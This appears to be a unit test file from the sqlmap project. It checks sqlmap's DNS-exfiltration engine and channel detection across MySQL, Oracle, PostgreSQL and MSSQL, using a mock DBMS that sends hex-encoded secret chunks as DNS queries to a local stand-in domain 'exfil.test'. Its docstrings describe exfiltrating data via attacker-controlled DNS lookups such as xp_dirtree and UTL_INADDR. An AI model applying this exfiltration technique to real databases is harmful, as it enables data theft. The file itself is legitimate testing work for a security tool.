#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission

The DNS-exfiltration extraction engine (lib/techniques/dns/use.py dnsUse) and the
channel-detection probe (lib/techniques/dns/test.py dnsTest).

DNS exfil is normally driven by a back-end DBMS that performs an actual DNS lookup
of an attacker-controlled hostname (Oracle UTL_INADDR, MSSQL xp_dirtree, ...),
encoding the queried data in the subdomain labels which then reach sqlmap's
in-process DNS server. That DBMS behaviour cannot be reproduced locally without a
real DNS-emitting engine, so here we drive the REAL dnsUse()/dnsTest() logic + the
REAL DNSServer (on a high port, no root) and emulate ONLY that one step: a mock
Request.queryPage plays the DBMS - it takes the per-iteration boundaries dnsUse
generated and fires a genuine UDP DNS query for
'prefix.<hex chunk of the secret>.suffix.domain' at the DNS server.

So the chunking/offset/reassembly loop, the dns_request snippet rendering, the
DNSServer packet parse, pop(prefix,suffix), regex extraction, hex decoding and the
detection-then-disable logic are all exercised for real; if any of them regress
these go red - without a live DBMS.

NOTE on fidelity: secrets are kept ASCII so the mock's byte-slice chunking matches a
DBMS character-substring exactly. Multi-byte (UTF-8) values, where DBMS SUBSTRING is
character-based and a chunk could split a code point, need the real-DBMS run.
"""

import binascii
import os
import socket
import struct
import sys
import threading
import time
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _testutils import bootstrap, set_dbms
bootstrap()

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.data import conf, kb
from lib.core.enums import DBMS
from lib.core.exception import SqlmapNotVulnerableException
from lib.core.settings import DNS_BOUNDARIES_ALPHABET
from lib.core.settings import MAX_DNS_LABEL
from lib.request.connect import Connect
from lib.request.dns import DNSServer
import lib.techniques.dns.use as dnsmod
import lib.techniques.dns.test as dnstestmod

DNS_PORT = 5355

def _build_query(name, tid=b"\x12\x34"):
    pkt = tid + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
    for label in name.split("."):
        if label:
            pkt += struct.pack("B", len(label)) + label.encode()
    return pkt + b"\x00" + b"\x00\x01" + b"\x00\x01"

class _HighPortDNSServer(DNSServer):
    # same logic as the real server (parse/pop/run), just bound high so no root is needed
    def __init__(self, port):
        self._requests = []
        self._lock = threading.Lock()
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._socket.bind(("127.0.0.1", port))
        self._running = False
        self._initialized = False

_CONF = {"dnsDomain": "exfil.test", "hexConvert": False, "api": False, "verbose": 0, "forceDns": False}
_KB = {"dnsTest": True, "dnsMode": False, "bruteMode": False, "safeCharEncode": False}


class _DnsCase(unittest.TestCase):
    DBMS_NAME = "MySQL"

    @classmethod
    def setUpClass(cls):
        cls.server = _HighPortDNSServer(DNS_PORT)
        cls.server.run()
        while not cls.server._initialized:
            time.sleep(0.02)

    def setUp(self):
        self._saved_conf = {k: conf.get(k) for k in _CONF}
        self._saved_kb = {k: kb.get(k) for k in _KB}
        self._saved_qp = Connect.queryPage
        self._saved_randomStr = dnsmod.randomStr
        self._saved_randomInt = dnstestmod.randomInt
        self._saved_dnsServer = conf.get("dnsServer")
        self._saved_hdbR, self._saved_hdbW = dnsmod.hashDBRetrieve, dnsmod.hashDBWrite
        for k, v in _CONF.items():
            conf[k] = v
        for k, v in _KB.items():
            kb[k] = v
        conf.dnsServer = self.server
        # isolate from the session hash DB (avoid cross-test value caching / uninitialized store)
        dnsmod.hashDBRetrieve = lambda *a, **k: None
        dnsmod.hashDBWrite = lambda *a, **k: None
        # MSSQL/PostgreSQL build the payload via the stacked-query injection plumbing
        # (agent.prefixQuery/agent.payload, needing a full kb.injection). That plumbing is
        # generic - not DNS logic - and the mock oracle ignores the payload, so stub it to a
        # pass-through; the DNS-specific snippet/substring/chunking still runs for real.
        self._saved_prefixQuery, self._saved_payload = agent.prefixQuery, agent.payload
        agent.prefixQuery = lambda expression, *a, **k: expression
        agent.payload = lambda place=None, parameter=None, value=None, newValue=None, where=None: newValue or ""
        set_dbms(self.DBMS_NAME)

    def tearDown(self):
        for k, v in self._saved_conf.items():
            conf[k] = v
        for k, v in self._saved_kb.items():
            kb[k] = v
        conf.dnsServer = self._saved_dnsServer
        Connect.queryPage = self._saved_qp
        dnsmod.Request.queryPage = self._saved_qp
        dnsmod.randomStr = self._saved_randomStr
        dnstestmod.randomInt = self._saved_randomInt
        dnsmod.hashDBRetrieve, dnsmod.hashDBWrite = self._saved_hdbR, self._saved_hdbW
        agent.prefixQuery, agent.payload = self._saved_prefixQuery, self._saved_payload

    def _install_oracle(self, secret, working=True, force=None):
        """
        Installs a mock queryPage that plays the DBMS: for each dnsUse iteration it fires a
        real UDP DNS query carrying the next hex chunk of L{secret}. working=False models a
        dead DNS channel (the DBMS never emits a lookup). force=(prefix, suffix) pins the
        random boundary labels (to construct adversarial cases like a domain/suffix collision).
        """
        secret_bytes = secret.encode("utf-8")
        boundaries = []
        served = [0]

        real_randomStr = self._saved_randomStr
        def spy_randomStr(length=4, alphabet=None, **kw):
            if alphabet == DNS_BOUNDARIES_ALPHABET and length == 3:
                out = force[len(boundaries) % 2] if force else real_randomStr(length=length, alphabet=alphabet, **kw)
                boundaries.append(out)
                return out
            return real_randomStr(length=length, alphabet=alphabet, **kw) if alphabet is not None else real_randomStr(length=length, **kw)
        dnsmod.randomStr = spy_randomStr

        dbms = Backend.getIdentifiedDbms()
        chunk_length = MAX_DNS_LABEL // 2 if dbms in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL // 4 - 2

        def oracle(payload=None, *args, **kwargs):
            if not working:
                return None
            prefix, suffix = boundaries[-2], boundaries[-1]
            chunk = secret_bytes[served[0]:served[0] + chunk_length]
            if chunk:
                host = "%s.%s.%s.%s" % (prefix, binascii.hexlify(chunk).decode(), suffix, conf.dnsDomain)
                c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                c.settimeout(3)
                c.sendto(_build_query(host), ("127.0.0.1", DNS_PORT))
                try:
                    c.recvfrom(512)
                finally:
                    c.close()
                served[0] += len(chunk)
                for _ in range(100):
                    with self.server._lock:
                        if any(host.encode() in r for r in self.server._requests):
                            break
                    time.sleep(0.01)
            return None

        Connect.queryPage = staticmethod(oracle)
        dnsmod.Request.queryPage = staticmethod(oracle)

    def _extract(self, secret):
        self._install_oracle(secret)
        return dnsmod.dnsUse("%s AND %d=%d", "user()")


class TestDnsExfilEngine(_DnsCase):
    DBMS_NAME = "MySQL"

    def test_short_value(self):
        self.assertEqual(self._extract("luther"), "luther")

    def test_value_spanning_multiple_dns_labels(self):
        # > one DNS label -> forces the chunking/offset/reassembly loop (multiple queries)
        secret = "The quick brown fox jumps over the lazy dog 0123456789 abcdef"
        self.assertEqual(self._extract(secret), secret)

    def test_exact_chunk_boundary(self):
        # length exactly one chunk: last-chunk break condition (len < chunk_length) edge
        dbms = Backend.getIdentifiedDbms()
        cl = MAX_DNS_LABEL // 2 if dbms in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL // 4 - 2
        secret = "A" * cl
        self.assertEqual(self._extract(secret), secret)

    def test_special_characters(self):
        secret = "p@ss W0rd!#%&"
        self.assertEqual(self._extract(secret), secret)

    def test_domain_label_colliding_with_suffix(self):
        # adversarial: --dns-domain's leading label equals the random suffix. A greedy
        # extraction regex would run past the real boundary into the domain and corrupt the
        # value; the (lazy) extraction must still recover it exactly.
        conf.dnsDomain = "hhh.exfil.test"          # leading label 'hhh' == forced suffix
        self._install_oracle("luther", force=("ggg", "hhh"))
        self.assertEqual(dnsmod.dnsUse("%s AND %d=%d", "user()"), "luther")


class TestDnsExfilEngineOracle(TestDnsExfilEngine):
    # Oracle: different dns_request snippet (UTL_INADDR.GET_HOST_ADDRESS, '||' concat) and
    # SUBSTRC substring template - re-runs the whole battery through the Oracle dialect.
    DBMS_NAME = "Oracle"


class TestDnsExfilEnginePostgres(TestDnsExfilEngine):
    # PostgreSQL: stacked-query branch (agent.payload), plpgsql COPY dns_request snippet,
    # 'SUBSTRING((...)::text FROM x FOR y)' substring template.
    DBMS_NAME = "PostgreSQL"


class TestDnsExfilEngineMssql(TestDnsExfilEngine):
    # MSSQL: stacked-query branch, xp_dirtree dns_request snippet, and crucially a SMALLER
    # chunk_length (MAX_DNS_LABEL//4 - 2) - exercises the alternate chunking arithmetic.
    DBMS_NAME = "Microsoft SQL Server"


class TestDnsLabelInvariant(unittest.TestCase):
    """The exfil chunk is hex-encoded into ONE DNS label, so 2*chunk_length must never exceed the
    63-octet DNS label limit - otherwise the query carries an invalid (over-long) label and exfil
    silently breaks. Guards the chunk_length arithmetic in dnsUse for every supported DBMS."""
    def test_hex_label_within_max_dns_label(self):
        for dbms in (DBMS.MYSQL, DBMS.ORACLE, DBMS.PGSQL, DBMS.MSSQL):
            chunk_length = MAX_DNS_LABEL // 2 if dbms in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL // 4 - 2
            self.assertGreater(chunk_length, 0, "%s: non-positive chunk_length" % dbms)
            self.assertLessEqual(2 * chunk_length, MAX_DNS_LABEL,
                                 "%s: hex label (%d) exceeds MAX_DNS_LABEL (%d)" % (dbms, 2 * chunk_length, MAX_DNS_LABEL))


class TestDnsChannelDetection(_DnsCase):
    """dnsTest(): probes the channel with a known random integer and disables DNS exfil if
    the value doesn't come back (unless --force-dns, which then aborts)."""
    DBMS_NAME = "MySQL"
    KNOWN = 4815162342

    def _patch_known_int(self):
        dnstestmod.randomInt = lambda *a, **k: self.KNOWN

    def test_detection_success_keeps_channel(self):
        self._patch_known_int()
        self._install_oracle(str(self.KNOWN), working=True)
        dnstestmod.dnsTest("%s AND %d=%d")
        self.assertTrue(kb.dnsTest)
        self.assertEqual(conf.dnsDomain, "exfil.test")   # channel kept

    def test_detection_failure_disables_channel(self):
        self._patch_known_int()
        self._install_oracle(str(self.KNOWN), working=False)   # dead channel
        dnstestmod.dnsTest("%s AND %d=%d")
        self.assertFalse(kb.dnsTest)
        self.assertIsNone(conf.dnsDomain)                 # exfil turned off

    def test_detection_failure_with_force_dns_raises(self):
        self._patch_known_int()
        conf.forceDns = True
        self._install_oracle(str(self.KNOWN), working=False)
        self.assertRaises(SqlmapNotVulnerableException, dnstestmod.dnsTest, "%s AND %d=%d")


if __name__ == "__main__":
    unittest.main(verbosity=2)
